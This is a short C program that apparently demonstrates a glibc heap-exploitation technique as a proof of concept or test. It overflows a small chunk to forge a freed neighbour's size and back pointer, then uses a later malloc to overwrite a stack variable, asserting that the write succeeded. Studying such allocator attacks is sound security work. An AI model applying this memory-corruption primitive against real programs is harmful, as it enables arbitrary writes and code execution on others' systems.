#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
#include <unistd.h>
int main() {
    setbuf(stdout, NULL);
setbuf(stdin, NULL);
unsigned long stack_var=0;
fprintf(stderr, "%s\n","alter before");
fprintf(stderr, "%p: %ld\n", &stack_var, stack_var);
//start 
intptr_t *overflow_malloc_object = malloc( 1); 
intptr_t *vicitim_malloc_object = malloc( 121); 
intptr_t *birrier_malloc_obejct = malloc( 1);
free(vicitim_malloc_object);
overflow_malloc_object[0] = (intptr_t)0;
overflow_malloc_object[1] = (intptr_t)0;
overflow_malloc_object[2] = (intptr_t)0;
overflow_malloc_object[3] = (intptr_t)145;
overflow_malloc_object[4] = (intptr_t)0;
overflow_malloc_object[5] = (intptr_t)(&stack_var-2);
intptr_t *insert_malloc_obejct = malloc( 121); 
//end
fprintf(stderr, "%s\n","alter after");
fprintf(stderr, "%p: %ld\n", &stack_var, stack_var);
assert(stack_var!=0);
printf("%s", "exp state arrive!");}